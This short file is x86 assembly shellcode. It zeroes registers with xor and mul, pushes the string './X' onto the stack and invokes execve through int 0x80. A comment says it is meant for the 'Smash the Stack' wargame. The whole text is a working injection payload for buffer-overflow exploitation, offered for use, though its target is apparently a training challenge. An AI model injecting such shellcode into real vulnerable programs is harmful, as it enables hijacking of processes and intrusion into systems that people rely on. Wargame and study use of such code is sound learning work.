# executes ./X, useful i.e. for Smash the Stack
.equ	SYS_EXECVE, 11

	.text
.globl _start
_start:
	xorl	%ecx, %ecx
	mull	%ecx			# %ecx = %eax = %edx = 0
	movb	$SYS_EXECVE, %al	# %eax = __NR_execve
	pushl	%ecx
	pushl	$0x582f2f2e	# X//.
	movl	%esp, %ebx	# arg 1 to exec is ./X
	int	$0x80		# sys_execve("./X", NULL, NULL)
